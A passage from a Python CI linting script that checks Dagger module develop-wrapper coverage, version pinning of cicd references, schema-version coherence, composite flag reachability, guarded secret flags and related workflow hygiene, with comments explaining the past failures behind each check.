_CASE_ARM_RE = re.compile(r"^\s*(?P<labels>src/[A-Za-z0-9_/-]+(?:\|src/[A-Za-z0-9_/-]+)*)\)\s*$")
_MODULE_VAR_RE = re.compile(r"^\$\{?MODULE\}?$")


def _normalise_module_ref(raw: str) -> str:
    """`"./src/build"`, `src/build/` and `./$MODULE` to a bare module path.

    `..` segments are collapsed here too, because dagger.json states a
    dependency as a path relative to the module directory (`../../security`).
    """
    ref = raw.strip().strip('"').strip("'")
    if ref.startswith("./"):
        ref = ref[2:]
    parts: list[str] = []
    for part in ref.split("/"):
        if part in ("", "."):
            continue
        if part == "..":
            if parts:
                parts.pop()
            continue
        parts.append(part)
    return "/".join(parts)


def _module_dependency_closure(root: pathlib.Path) -> dict[str, set[str]]:
    """Every module's own path plus every module it transitively depends on.

    Read from each dagger.json's `dependencies[].source`, which is a path
    relative to the module directory. A dependency that is not a local path — a
    git address — is ignored: nothing in this repository develops it, and the
    CLI fetches it the same way whether or not a wrapper ran.
    """
    direct: dict[str, set[str]] = {}
    for path in sorted(root.glob("src/**/dagger.json")):
        module = path.parent.relative_to(root).as_posix()
        try:
            manifest = json.loads(path.read_text())
        except (OSError, json.JSONDecodeError):
            # A dagger.json this cannot read is not silently treated as
            # dependency-free: check_module_inventory owns the file's existence,
            # and an unreadable manifest here narrows the closure, which can
            # only produce a false *failure* — never a false pass.
            direct[module] = set()
            continue
        deps: set[str] = set()
        for entry in manifest.get("dependencies") or []:
            source = str(entry.get("source") or "")
            if not source.startswith((".", "/")):
                continue
            deps.add(_normalise_module_ref(f"{module}/{source}"))
        direct[module] = deps

    closure: dict[str, set[str]] = {}

    def walk(module: str, seen: frozenset[str]) -> set[str]:
        if module in closure:
            return closure[module]
        if module in seen:
            return {module}
        out = {module}
        for dep in direct.get(module, set()):
            out |= walk(dep, seen | {module})
        if module not in seen:
            closure[module] = out
        return out

    for module in direct:
        walk(module, frozenset())
    return closure


def _uncommented(line: str) -> str:
    """The line with a trailing `#` comment removed.

    Both YAML and shell spell a comment the same way, and this check reads
    both. Prose is where a module path is most likely to be *mentioned* rather
    than run: the first version of this check read `dagger functions -m
    ./src/stage-N` out of a smoke script's header comment and reported a module
    that does not exist. A `#` inside quotes is left alone — a URL fragment or
    a `--flag '#x'` is not a comment — which is approximate, and safe in the
    approximate direction: at worst a genuine call stays visible.
    """
    quote = ""
    for index, char in enumerate(line):
        if quote:
            if char == quote:
                quote = ""
            continue
        if char in "'\"":
            quote = char
        elif char == "#" and (index == 0 or line[index - 1].isspace()):
            return line[:index]
    return line


def _dagger_module_refs(text: str) -> list[str]:
    """Every `-m <module>` a `dagger` command in this text is pointed at."""
    refs: list[str] = []
    for line in text.splitlines():
        for hit in _DAGGER_MODULE_RE.finditer(_uncommented(line)):
            ref = _normalise_module_ref(hit.group("mod"))
            if ref not in refs:
                refs.append(ref)
    return refs


def _workflow_jobs(lines: list[str]) -> list[tuple[str, int, int]]:
    """Each job in a workflow as (name, first line index, end line index).

    Hand-rolled for the same reason as _run_block_bodies: no third-party
    dependency, and the shape needed is narrow — 2-space keys under `jobs:`.
    Job boundaries matter because an engine, and therefore a generated SDK, is
    never shared between two jobs.
    """
    jobs: list[tuple[str, int, int]] = []
    in_jobs = False
    current: tuple[str, int] | None = None
    for index, line in enumerate(lines):
        if line.startswith("jobs:"):
            in_jobs = True
            continue
        if not in_jobs or not line.strip() or line.lstrip().startswith("#"):
            continue
        indent = len(line) - len(line.lstrip())
        if indent == 0:
            if current is not None:
                jobs.append((current[0], current[1], index))
                current = None
            in_jobs = False
            continue
        match = _YAML_KEY_RE.match(line)
        if match is not None and indent == 2:
            if current is not None:
                jobs.append((current[0], current[1], index))
            current = (match.group(2), index)
    if current is not None:
        jobs.append((current[0], current[1], len(lines)))
    return jobs


def check_cross_module_develop(inv: Inventory) -> list[str]:
    """No `dagger call` may generate a module's SDK outside the develop wrapper.

    See the comment above _DEVELOP_CALL_RE for the failure this refuses. The
    check walks each job's lines in order, tracks which modules the wrapper has
    developed (expanded to their dependency closure), and reports every
    `dagger -m ./src/X` no earlier wrapper call covers.

    `$MODULE` is a matrix cell's own module and is resolved from the
    `case "$MODULE" in` arm the call sits under, so a cell that develops
    "$MODULE" covers its own calls and nothing else. A step invoking
    `scripts/smoke/<name>.sh` is followed into that script, because a
    `dagger -m` line running there is exactly as unwrapped as one written
    inline — scripts/smoke/commit-apps.sh is how that was found.
    """
    problems: list[str] = []
    closure = _module_dependency_closure(inv.root)
    smoke_refs: dict[str, list[str]] = {}
    smoke_dir = inv.root / SMOKE_DIR
    if smoke_dir.is_dir():
        for path in sorted(smoke_dir.glob("*.sh")):
            smoke_refs[f"{SMOKE_DIR}/{path.name}"] = _dagger_module_refs(path.read_text())

    for rel in inv.group_paths(inv.workflow_surface_groups):
        path = inv.root / rel
        if not path.is_file():
            continue  # check_declared_paths_exist owns missing files
        lines = path.read_text().splitlines()
        for name, start, end in _workflow_jobs(lines):
            developed: set[str] = set()
            develops_own = False
            arm: list[str] = []
            for offset, raw_line in enumerate(lines[start:end]):
                lineno = start + offset + 1
                line = _uncommented(raw_line)
                arm_match = _CASE_ARM_RE.match(line)
                if arm_match is not None:
                    arm = [_normalise_module_ref(x) for x in arm_match.group("labels").split("|")]
                elif line.strip() == ";;":
                    arm = []

                for hit in _DEVELOP_CALL_RE.finditer(line):
                    raw = hit.group("mod")
                    if _MODULE_VAR_RE.match(raw.strip().strip('"')):
                        develops_own = True
                        continue
                    module = _normalise_module_ref(raw)
                    developed |= closure.get(module, {module})

                refs = _dagger_module_refs(line)
                for smoke, script_refs in smoke_refs.items():
                    if smoke in line:
                        refs += [r for r in script_refs if r not in refs]
                for ref in refs:
                    if _MODULE_VAR_RE.match(ref):
                        if develops_own:
                            continue
                        problems.append(
                            f"{rel}:{lineno}  job `{name}` runs `dagger -m ./$MODULE` with no "
                            f"earlier `scripts/ci/dagger-develop.sh \"$MODULE\"`, so the cell "
                            f"generates its own SDK inside the call — unclassified, unretried."
                        )
                        continue
                    if not ref.startswith("src/"):
                        continue
                    reachable = set(developed)
                    if develops_own and arm:
                        # The *intersection*, not the union. A `src/stage-2|src/stage-4)`
                        # arm runs for whichever cell matched, and "$MODULE" developed
                        # exactly that one — so a call is covered only if every label's
                        # closure covers it. Unioning here made the arm cover both
                        # modules and hid the gap that stage-orchestrators.sh's
                        # cross-calls actually are.
                        covered = closure.get(arm[0], {arm[0]})
                        for label in arm[1:]:
                            covered &= closure.get(label, {label})
                        reachable |= covered
                    if ref in reachable:
                        continue
                    where = f", arm `{'|'.join(arm)}`" if arm else ""
                    problems.append(
                        f"{rel}:{lineno}  job `{name}`{where} runs `dagger -m ./{ref}`, which no "
                        f"earlier `scripts/ci/dagger-develop.sh` covers — it is neither the module "
                        f"this job develops nor in that module's dependency closure. The CLI "
                        f"generates {ref}'s SDK inside the call, so a module-fetch fault there is "
                        f"reported as a compile error and never retried."
                    )
    return problems


# --- a ref that is not a version is a pin nothing checks ---------------------
# Every pin mechanism in this file keys on `@v<X.Y.Z>`: VERSION_SCAN (skew),
# CICD_PIN_PATTERNS (the release bumper's rewrite), and DAGGER_CALL_RE
# (command-exists). A ref in any other shape matches none of them, so it is not
# reported as wrong — it is not seen at all, and three checks go quiet together.
#
# v3.8.4 shipped `.github/workflows/dast.yml` pinned to
# `github.com/context-and-oss/cicd/src/composites/dast@fix/dast-evidence-write` at
# two sites. That branch was deleted when its pull request merged, so every
# consumer of `dast.yml@v3.8.4` gets a module the CLI cannot resolve — the DAST
# pipeline broken for everyone, on a released tag, with check-workflow-pins.py
# and check-repo-surface.py both reporting OK. `call scan` and `call package`
# went unverified for the same reason.
#
# This is the founding doctrine at the pin layer: a checker that could not look
# read exactly like a checker that looked and found nothing.
_CICD_REF_RE = re.compile(r"context-and-oss/cicd/(?P<path>[A-Za-z0-9/_.\-]+)@(?P<ref>[A-Za-z0-9/._\-]+)")
_VERSION_REF_RE = re.compile(r"^v\d+\.\d+\.\d+$")


def check_cicd_refs_are_versions(inv: Inventory) -> list[str]:
    """Every context-and-oss/cicd reference in an active surface names a version.

    Not "agrees with the others" — check_pin_consistency owns that, and it can
    only compare what it can see. This one asks the prior question: is the ref a
    version at all? A branch, a tag that is not a version, a commit sha or
    `main` are each refused, because each is invisible to the bumper and would
    silently outlive the branch it names.

    Scope is the active surfaces, the same set check_pin_consistency walks.
    Historical documents are excluded by construction, which is correct: a spec
    quoting the ref that broke must not be forced to rewrite history.
    """
    problems: list[str] = []
    for rel in inv.active_surfaces:
        path = inv.root / rel
        if not _readable(path):
            continue  # check_declared_paths_exist owns a missing file
        for lineno, line in enumerate(path.read_text().splitlines(), 1):
            for hit in _CICD_REF_RE.finditer(line):
                ref = hit.group("ref")
                if _VERSION_REF_RE.match(ref):
                    continue
                problems.append(
                    f"{rel}:{lineno}  context-and-oss/cicd/{hit.group('path')}@{ref} is not a "
                    f"version pin. The release bumper rewrites only `@vX.Y.Z`, so this ref "
                    f"never moves; the skew and command-exists checks read only `@vX.Y.Z`, "
                    f"so neither one can see it. v3.8.4 shipped dast.yml pinned to a branch "
                    f"that had already been deleted, with every pin check green."
                )
    return problems


def check_schema_version_coherence(inv: Inventory) -> list[str]:
    """The evidence schemaVersion says the same thing everywhere it is written.

    The version stood at 1.0.0 while the envelope gained Sources, Tests,
    TestsByLanguage and SourceStatus.Scope, and the reason is visible here: the
    string lives in a canonical constant, ten module copies of schema.go, a
    const in schema.json, seven outputSchema declarations across four
    contract.json files, and an allowlist in the contract validator. Moving it
    was a coordinated edit across six kinds of file with nothing checking the
    result, so it was never moved. This check is what makes moving it safe.

    Two of those places are already held by other checks — the nine synced
    schema.go copies by check_generated_files, the schema.json property set by
    schema_json_test.go — and are re-checked here anyway. The overlap is
    deliberate: those checks pin the copies to the generator and the shape, and
    neither says a word about the version string inside them.

    contract.json declares the MAJOR family (evidence-1, evidence-1[]) rather
    than the exact version. A contract file is static text while the payload is
    what actually arrives, so a contract naming a minor version makes a claim
    it cannot keep: the minor moves with the envelope and the file stands
    still. The precise version travels in the envelope's own schemaVersion
    field, which schema_version_test.go now gates against the wire shape.
    """
    root = inv.root
    canonical_path = root / _CANONICAL_SCHEMA
    if not _present(canonical_path):
        return [f"{_CANONICAL_SCHEMA} is unreadable, so no version can be checked"]

    found = _SCHEMA_VERSION_CONST.findall(canonical_path.read_text())
    if len(found) != 1:
        return [
            f"{_CANONICAL_SCHEMA} declares {len(found)} schema-version "
            f"constant(s); expected exactly one"
        ]
    canonical = found[0]

    parts = canonical.split(".")
    if len(parts) != 3 or not all(p.isdigit() for p in parts):
        return [
            f"{_CANONICAL_SCHEMA}: SchemaVersion {canonical!r} is not "
            f"major.minor.patch, so no family name can be derived from it"
        ]
    family = f"evidence-{parts[0]}"

    problems: list[str] = []

    # Every module's copy of the constant, synced or hand-maintained.
    for rel in sorted(set(inv.schema_modules)):
        path = root / rel / "schema.go"
        if not _present(path):
            continue  # check_declared_paths_exist owns the absence.
        for ver in _SCHEMA_VERSION_CONST.findall(path.read_text()):
            if ver != canonical:
                problems.append(
                    f"{rel}/schema.go declares schema version {ver!r}, "
                    f"canonical is {canonical!r}"
                )

    # schema.json names the version it describes.
    json_path = root / _CANONICAL_SCHEMA_JSON
    if _present(json_path):
        consts = _SCHEMA_JSON_CONST.findall(json_path.read_text())
        if canonical not in consts:
            problems.append(
                f"{_CANONICAL_SCHEMA_JSON} pins no schemaVersion const equal to "
                f"{canonical!r} (found {consts or 'none'})"
            )

    # Contracts declare the family, never a minor.
    for path in sorted(root.glob("src/**/contract.json")):
        rel = path.relative_to(root).as_posix()
        if not _present(path):
            continue
        for declared in _EVIDENCE_OUTPUT_SCHEMA.findall(path.read_text()):
            if declared not in (family, f"{family}[]"):
                problems.append(
                    f"{rel} declares outputSchema {declared!r}; contracts name "
                    f"the major family, so expected {family!r} or {family + '[]'!r}"
                )

    # The validator accepts exactly that family and nothing older. An absent
    # allowlist is a problem, not a pass: the map moved from main.go to
    # verify.go once, and had the old path been read as "nothing to check" the
    # family would have gone unverified from that commit on.
    allow_path = root / _CONTRACT_ALLOWLIST
    if not _present(allow_path):
        problems.append(
            f"{_CONTRACT_ALLOWLIST} is missing; it holds validOutputSchemas, the "
            "set of outputSchema values the contract verifier accepts"
        )
    else:
        keys = set(_EVIDENCE_ALLOWLIST_KEY.findall(allow_path.read_text()))
        want = {family, f"{family}[]"}
        for extra in sorted(keys - want):
            problems.append(
                f"{_CONTRACT_ALLOWLIST} still accepts outputSchema {extra!r}, "
                f"which no contract may declare at schema version {canonical!r}"
            )
        for missing in sorted(want - keys):
            problems.append(
                f"{_CONTRACT_ALLOWLIST} does not accept outputSchema {missing!r}"
            )

    # No CI step or smoke asserts the version as a stale literal.
    #
    # This is the half of the surface the checks above do not see, and it is
    # where the two real stale literals were found: .github/workflows/ci.yml
    # asserted schemaVersion == '1.0.0' on the composite evidence, and
    # scripts/smoke/commit-shapes.sh asserted the same. Neither is a schema
    # module, a contract or the validator, so nothing above would have said a
    # word -- the bump would have gone red in CI after a push instead of here.
    #
    # Both now derive the version from the canonical file, so on a healthy tree
    # this finds nothing. That is the intended state: the check exists to stop a
    # literal being reintroduced, not to police one that is currently there.
    for rel in sorted(_version_assertion_files(root)):
        path = root / rel
        if not _present(path):
            continue
        for literal in _SCHEMA_VERSION_COMPARISON.findall(path.read_text()):
            if literal != canonical:
                problems.append(
                    f"{rel} compares schemaVersion against {literal!r}, but the "
                    f"schema version is {canonical!r} -- read it from "
                    f"{_CANONICAL_SCHEMA} instead of writing it here"
                )

    return problems


# A composite gains a parameter in Go and the starter surfaces do not follow.
# Nothing notices: the composite keeps its default, every pipeline stays green,
# and the feature exists for whoever calls the module by hand and for nobody
# else. `--license-gate`, `--license-allow` and `--license-exclude` reached
# precommit.yml in v2 and commit.yml never at all, so a consumer on the commit
# lane received licence findings it had no way to act on. That is the
# founding doctrine on the configuration side: a knob nobody can reach and a
# knob nobody needs look identical from outside.
#
# What this proves is MENTION, not configurability. A flag hardcoded on the call
# line (`--fail-on HIGH` in the ADO templates) counts as reached, because
# somebody decided it and the decision is on the line a reader opens. What it
# refuses is the parameter no surface names at all — the one nobody decided
# about, which is the shape drift actually takes.
_GO_ENTRY_SIG = re.compile(r"^func \(\w+ \*[A-Za-z0-9_]+\) (?P<method>[A-Z][A-Za-z0-9_]*)\(\s*$")


def dagger_flag_name(param: str) -> str:
    """`licenseAllow` -> `license-allow`, matching Dagger's CLI flag mangling."""
    return re.sub(r"(?<!^)(?=[A-Z])", "-", param).lower()


def _entry_params(inv: Inventory, mod_rel: str, method: str) -> tuple[list[str], list[str]]:
    """Parameter names of a module's exported entry function, or why not.

    Parsed from source rather than from `dagger functions`, which needs an
    engine, a network and a generated SDK — none of which a surface check can
    require. The parse is deliberately narrow: one parameter per line, which is
    how every module in this repository is written, and a grouped form
    (`a, b, c string`) is handled because gofmt permits it. Anything it cannot
    read is returned as a problem, never as an empty parameter list — an empty
    list would make every surface reachable by vacuity, which is the failure
    this check exists to remove.
    """
    for go in sorted((inv.root / mod_rel).glob("*.go")):
        try:
            lines = go.read_text(encoding="utf-8").splitlines()
        except OSError as exc:
            return [], [f"{mod_rel}: cannot read {go.name} ({exc})"]
        for index, line in enumerate(lines):
            match = _GO_ENTRY_SIG.match(line)
            if match is None or match.group("method") != method:
                continue
            params: list[str] = []
            for body in lines[index + 1:]:
                stripped = body.strip()
                if stripped.startswith(")"):
                    if not params:
                        return [], [
                            f"{mod_rel}: {method}() parsed to no parameters, which "
                            f"would make every surface reachable by vacuity"
                        ]
                    return params, []
                if not stripped or stripped.startswith("//"):
                    continue
                parts = stripped.rstrip(",").split()
                if len(parts) < 2:
                    return [], [
                        f"{mod_rel}: cannot read parameter line {body.strip()!r} in "
                        f"{method}() — refusing to report a partial signature"
                    ]
                params.extend(part.rstrip(",") for part in parts[:-1])
            return [], [
                f"{mod_rel}: {method}() has no closing parenthesis this parser can find"
            ]
    return [], [
        f"{mod_rel}: no multi-line `func (…) {method}(` found. Either the entry "
        f"function was renamed or it was reformatted onto one line; the reach "
        f"check cannot read it either way, and will not call that agreement."
    ]


# `run:` on GitHub, `bash:` on Azure DevOps. The reach check reads the script a
# step actually executes and nothing else, because prose is not a flag: the
# first version of this check read `--include` out of a code comment saying "one
# flag per entry, like --include" and reported a template as forwarding a
# parameter it never passed. The same lesson as check_cross_module_develop,
# arrived at from the other side.
_SCRIPT_BLOCK_RE = re.compile(
    r"^(?P<lead>\s*(?:-\s+)?)(?:run|bash|script):\s*[|>][-+]?\d*\s*(?:#.*)?$"
)


def _script_block_bodies(text: str) -> list[str]:
    """Every `run:`/`bash:`/`script:` block scalar body in a pipeline file."""
    out: list[str] = []
    lines = text.splitlines()
    i = 0
    while i < len(lines):
        match = _SCRIPT_BLOCK_RE.match(lines[i])
        if match is None:
            i += 1
            continue
        key_indent = len(match.group("lead"))
        body: list[str] = []
        i += 1
        while i < len(lines):
            line = lines[i]
            if line.strip() and len(line) - len(line.lstrip()) <= key_indent:
                break
            body.append(line)
            i += 1
        out.append("\n".join(body))
    return out


# The one-line form, `run: dagger -m ... call run --src .`. It is read for the
# same reason the block form is: a call found in it is graded, so its flags have
# to be readable too, or a surface would be judged against text this function
# refused to look at.
_INLINE_SCRIPT_RE = re.compile(r"^\s*(?:-\s+)?(?:run|bash|script):\s+(?P<body>\S.*)$")


def _commanding_text(text: str) -> str:
    """The part of a surface that issues commands, with commentary removed.

    A file with neither a script block nor an inline script is a shell script in
    its own right (the local pre-push helpers), so its whole body counts.
    Comment-only lines are dropped in every case; an inline trailing comment is
    left alone, since a flag named only after a `#` at the end of a command line
    is not a shape this repository writes and stripping one correctly means
    parsing shell quoting.
    """
    parts = list(_script_block_bodies(text))
    for line in text.splitlines():
        match = _INLINE_SCRIPT_RE.match(line)
        if match is not None:
            parts.append(match.group("body"))
    source = "\n".join(parts) if parts else text
    return "\n".join(
        line for line in source.splitlines() if not line.lstrip().startswith("#")
    )


def _composite_calls(text: str) -> set[tuple[str, str]]:
    """(module path, command) for every composite call in a surface's text."""
    found: set[tuple[str, str]] = set()
    for _lineno, line in logical_lines(text):
        for scan in (REMOTE_CALL_SCAN, LOCAL_CALL_SCAN):
            for match in scan.finditer(line):
                mod_rel = match.group("path")
                if mod_rel.startswith("src/composites/"):
                    found.add((mod_rel, match.group("cmd")))
    return found


def check_composite_params_reachable(inv: Inventory) -> list[str]:
    """Every composite parameter is named by each starter surface, or excused.

    Scope is the manifest's composite_reach.surface_groups — the workflows and
    templates a consumer configures. This repository's own internal workflows
    are out of scope on purpose: they are one team's pinned choices, not a
    product surface, and grading them would bury the real gaps under thirty
    excuses per file.

    An exemption carries a reason, and a stale one is itself a problem: once a
    parameter is forwarded, its excuse has to go, or the list slowly becomes a
    second, quieter place where a knob can be unreachable.
    """
    if not inv.composite_reach_groups:
        return [
            "composite_reach.surface_groups is empty, so this check grades no "
            "surface and passes vacuously. Declare the groups or remove the check."
        ]
    problems: list[str] = []
    excused: dict[tuple[str, str], str] = {
        (param, site): reason for param, site, reason in inv.composite_reach_unreachable
    }
    used: set[tuple[str, str]] = set()
    declared_unreadable = dict(inv.composite_reach_unreadable)
    seen_unreadable: set[str] = set()
    graded = 0

    for rel in inv.group_paths(inv.composite_reach_groups):
        path = inv.root / rel
        if not _readable(path):
            continue
        text = path.read_text(encoding="utf-8")
        commands = _commanding_text(text)
        calls = _composite_calls(text)
        if not calls:
            if "src/composites/" in text:
                seen_unreadable.add(rel)
                if rel not in declared_unreadable:
                    problems.append(
                        f"{rel}  names a composite but no `-m <module> call <cmd>` this "
                        f"check can resolve, so none of that composite's parameters is "
                        f"graded here. Declare it under composite_reach.unreadable_sites "
                        f"with a reason, or write the module reference literally."
                    )
            continue
        for mod_rel, cmd in sorted(calls):
            params, parse_problems = _entry_params(inv, mod_rel, kebab_to_method(cmd))
            if parse_problems:
                problems.extend(f"{rel}  {problem}" for problem in parse_problems)
                continue
            graded += 1
            for param in params:
                if param == "ctx":
                    continue
                flag = dagger_flag_name(param)
                if f"--{flag}" in commands:
                    continue
                if (flag, rel) in excused:
                    used.add((flag, rel))
                    continue
                problems.append(
                    f"{rel}  never names --{flag}, a parameter of "
                    f"{mod_rel}.{kebab_to_method(cmd)}(), so a consumer of this surface "
                    f"cannot reach it and the composite's default is the only value it "
                    f"will ever have. Forward it, or record it under "
                    f"composite_reach.unreachable with a reason."
                )

    for (flag, rel), reason in sorted(excused.items()):
        if (flag, rel) not in used:
            problems.append(
                f"composite_reach.unreachable excuses --{flag} on '{rel}', but that "
                f"surface either reaches it now or calls no composite taking it — "
                f"remove the entry (reason recorded: {reason})"
            )
    for rel, reason in sorted(declared_unreadable.items()):
        if rel not in seen_unreadable:
            problems.append(
                f"composite_reach.unreadable_sites names '{rel}', but its composite "
                f"calls resolve now or it names no composite — remove the entry "
                f"(reason recorded: {reason})"
            )
    if not problems and graded == 0:
        return [
            "composite_reach graded no composite call at all. Every surface in the "
            "declared groups resolved to nothing, so this check proved nothing."
        ]
    return problems


# How far above an array append this check looks for the conditional that
# guards it. The shapes in this repository put the test on the same line (the
# GitHub `if [ -n ... ]; then extra+=(...); fi` one-liner) or two lines above
# (the Azure DevOps `case ... in` / `''|'$('*) ;;` / `*) extra+=(...)` block).
# Twelve lines is room for a longer case with several excluded forms, and is
# deliberately finite: a guard further away than that is not one a reader of the
# append would see either.
GUARD_LOOKBACK_LINES = 12

_GUARD_OPENERS = ("if ", "elif ", "case ")


def _guard_condition(line: str) -> str | None:
    """The condition a shell conditional tests, or None if this is not one.

    Only the condition is returned, never the body: the one-liner
    `if [ -n "$X" ]; then extra+=(--flag env:X); fi` mentions X twice, and a
    naive substring search over the whole line therefore accepts a guard that
    tests something else entirely — the copy-paste this check exists to catch.
    """
    stripped = line.strip()
    if "; then" in stripped:
        head = stripped.split("; then", 1)[0]
        return head if head.lstrip().startswith(("if ", "elif ")) else None
    if stripped.startswith("case ") and stripped.rstrip().endswith(" in"):
        return stripped[len("case "):-len(" in")]
    if stripped.startswith(_GUARD_OPENERS):
        return stripped
    return None


def _line_guards(line: str, variable: str) -> bool:
    """Whether this line is a shell conditional testing `variable`."""
    condition = _guard_condition(line)
    return condition is not None and variable in condition


def check_guarded_flags(inv: Inventory) -> list[str]:
    """A flag that switches on an optional channel is passed only when it exists.

    Passing one unconditionally does not fail, which is the whole problem: an
    unset GitHub secret arrives as a non-nil, empty Secret under
    `secrets: inherit`, and an undefined Azure DevOps variable arrives as its
    own literal text. cicd posted a Teams card to the empty string on every run
    of every repository that had not configured Teams, wrote the transport error
    into a log nobody reads, and reported success.

    A guarded occurrence appends to a shell array from inside a conditional
    naming the same variable. The conditional is required and not merely the
    array: an unconditional `extra+=(--flag env:NAME)` is the same defect one
    line over, and it is the shape a repair would most plausibly regress into.
    """
    if not inv.guarded_flags:
        return [
            "guarded_flags.flags is empty, so this check grades no flag and passes "
            "vacuously. Declare the flags or remove the check."
        ]
    if not inv.guarded_flag_groups:
        return [
            "guarded_flags.surface_groups is empty, so this check grades no surface "
            "and passes vacuously. Declare the groups or remove the check."
        ]
    problems: list[str] = []
    seen: dict[str, int] = {flag: 0 for flag, _variable, _reason in inv.guarded_flags}

    for rel in inv.group_paths(inv.guarded_flag_groups):
        path = inv.root / rel
        if not _readable(path):
            continue
        lines = _commanding_text(path.read_text(encoding="utf-8")).splitlines()
        for index, line in enumerate(lines):
            for flag, variable, reason in inv.guarded_flags:
                if f"--{flag}" not in line:
                    continue
                seen[flag] += 1
                window = lines[max(0, index - GUARD_LOOKBACK_LINES):index + 1]
                if "+=(" not in line:
                    problems.append(
                        f"{rel}:{index + 1}  passes --{flag} on a command line, so it is "
                        f"passed on every run whether or not {variable} is set. An unset "
                        f"value still reaches the composite, as an empty value or a "
                        f"literal placeholder, and reads as one that was supplied. "
                        f"Append it to the argument array from inside a conditional "
                        f"testing {variable} instead (reason recorded: {reason})"
                    )
                    continue
                if not any(_line_guards(candidate, variable) for candidate in window):
                    problems.append(
                        f"{rel}:{index + 1}  appends --{flag} to an argument array, but no "
                        f"conditional testing {variable} appears within "
                        f"{GUARD_LOOKBACK_LINES} lines above it, so the append is "
                        f"unconditional and the flag is passed whether or not the value "
                        f"exists (reason recorded: {reason})"
                    )

    for flag, _variable, reason in inv.guarded_flags:
        if seen[flag] == 0:
            problems.append(
                f"guarded_flags declares --{flag}, but no surface in the declared "
                f"groups passes it at all, so this check proves nothing about it — "
                f"remove the entry (reason recorded: {reason})"
            )
    return problems


# `git diff … || : > "$out"` wrote an empty change diff whenever the diff could
# not be computed — a shallow checkout, a base the runner never fetched — and
# every surface then passed that empty file as --diff. The intent gate reads an
# empty diff as a change that touched nothing in scope and audits the whole tree
# instead, so a pull request carrying no artifact passed on the strength of the
# artifacts already on main. Seven surfaces carried the shape, each behind a
# `continue-on-error` that hid the failure a second time.
_SWALLOWED_STATUS_RE = re.compile(r"\|\|\s*(?::|true)(?=\s|;|$|>)")


def check_change_diff_not_swallowed(inv: Inventory) -> list[str]:
    """A `git diff` that feeds the change scope must not have its failure discarded.

    Scoped to the surfaces the guarded-flag check reads, which are the ones
    that compute a change diff for a composite. `|| :` and `|| true` are refused
    on the logical line that runs `git diff`; any other handler (`|| exit 1`, a
    function that reports and exits) is the caller's to word.
    """
    problems: list[str] = []
    for rel in inv.group_paths(inv.guarded_flag_groups):
        path = inv.root / rel
        if not _readable(path):
            continue
        for lineno, line in logical_lines(_commanding_text(path.read_text(encoding="utf-8"))):
            if "git diff" not in line or not _SWALLOWED_STATUS_RE.search(line):
                continue
            problems.append(
                f"{rel}: logical line {lineno} of its commands discards the exit "
                f"status of `git diff`, so a diff that could not be computed leaves "
                f"an empty change set that the intent gate reads as a change "
                f"touching nothing and answers with a whole-tree audit. Fail the "
                f"step on a pull request, or pass no --diff when there is nothing "
                f"to scope (specs/a-diff-the-workflow-could-not-compute-is-not-an-empty-diff.md)"
            )
    return problems


# `--sast-rulesets` has defaulted to `p/security-audit` since the security module
# started refusing semgrep's `auto` (it cannot run without reporting to a third
# party, and the refusal is what keeps an empty-ruleset scan from reading as a
# clean one — src/security/CLAUDE.md). Eleven active surfaces went on saying
# the default was "auto" regardless: a consumer who set the input to empty "to
# keep the default" got exactly what the module ships, and one who typed the
# documented default got a hard error from the one value every surface named.
# A claim about a default is a claim about code, and nothing compared the two.
#
# The shape refused is the claim itself — "default ("auto")", "Default is
# `auto`", "defaults to 'auto'" — on a line that is about SAST, Semgrep or a
# ruleset, or whose neighbour is (the workflow comment that said it split the
# subject and the claim across two lines). The sentence "the default is
# p/security-audit; auto is refused" is the correct one and does not match:
# there, `default` is followed by the real value, not by `auto`.
_SAST_SUBJECT_RE = re.compile(r"(?i)\bsast\b|semgrep|ruleset")
_SAST_AUTO_DEFAULT_RE = re.compile(
    r"(?i)\bdefaults?(?:\s+(?:is|to))?\s*[(:=]?\s*[\"'`(]+auto[\"'`)]"
    r"|[\"'`]auto[\"'`]\s+(?:is|as)\s+(?:the\s+)?default\b"
)
SAST_DEFAULT = "p/security-audit"


def check_sast_default_wording(inv: Inventory) -> list[str]:
    """No active surface may say that `--sast-rulesets` defaults to `auto`.

    The security module refuses `auto` outright, so a surface that names it as
    the default sends a consumer to a value that cannot run, and tells the one
    who left the input empty that they chose something they did not. Historical
    documents are out of scope by construction; they record what was true.
    """
    problems: list[str] = []
    for rel in inv.active_surfaces:
        path = inv.root / rel
        if not _readable(path):
            continue  # check_declared_paths_exist owns a missing file
        lines = path.read_text().splitlines()
        for i, line in enumerate(lines):
            if not _SAST_AUTO_DEFAULT_RE.search(line):
                continue
            window = lines[max(0, i - 1):i + 2]
            if not any(_SAST_SUBJECT_RE.search(w) for w in window):
                continue
            problems.append(
                f"{rel}:{i + 1}  says the SAST ruleset default is \"auto\". The security "
                f"module refuses \"auto\" (it cannot run without reporting to a third "
                f"party), and the default it ships is {SAST_DEFAULT}; a consumer who "
                f"types the documented default gets a hard error, and one who leaves "
                f"the input empty is told they chose a value they did not."
            )
    return problems


# A pre-commit run for a commit a pull request no longer points at produces a
# verdict nobody reads, so a new push to the PR cancels it. A commit run is the
# opposite: GitHub keeps at most one *pending* run per concurrency group and
# cancels the waiting one when another arrives, with or without
# cancel-in-progress, so any grouping of pushes to main skips the commits in
# between and those shas never get commit-stage evidence. Both halves are the
# absence or presence of a few YAML lines that a copy edits without noticing.
PRECOMMIT_CALLERS = (
    "templates/github-actions/precommit.yml",
    ".github/workflows/dogfood-precommit.yml",
)
COMMIT_WORKFLOW_GLOBS = (
    "templates/github-actions/commit*.yml",
    ".github/workflows/commit*.yml",
)
_PR_GROUP = "format('pr-{0}', github.event.pull_request.number)"
_PR_ONLY_CANCEL = "${{ github.event_name == 'pull_request' }}"
_CONCURRENCY_KEY_RE = re.compile(r"^\s*concurrency\s*:")


def _top_level_block(lines: list[str], key: str) -> dict[str, str] | None:
    """The scalar children of a top-level YAML mapping key, or None if absent."""
    for index, line in enumerate(lines):
        if line.rstrip() != f"{key}:":
            continue
        children: dict[str, str] = {}
        for child in lines[index + 1:]:
            if child.strip() and not child[0].isspace():
                break
            stripped = child.strip()
            if not stripped or stripped.startswith("#") or ":" not in stripped:
                continue
            name, _, value = stripped.partition(":")
            children[name.strip()] = value.strip()
        return children
    return None


def check_superseded_runs(inv: Inventory) -> list[str]:
    """Pre-commit callers cancel a superseded PR run; commit workflows group nothing."""
    problems: list[str] = []
    for rel in PRECOMMIT_CALLERS:
        path = inv.root / rel
        if not _readable(path):
            problems.append(
                f"{rel}  is not there to grade. It is the pre-commit caller this check "
                f"requires to cancel a superseded PR run; if it moved, move the name "
                f"in PRECOMMIT_CALLERS with it"
            )
            continue
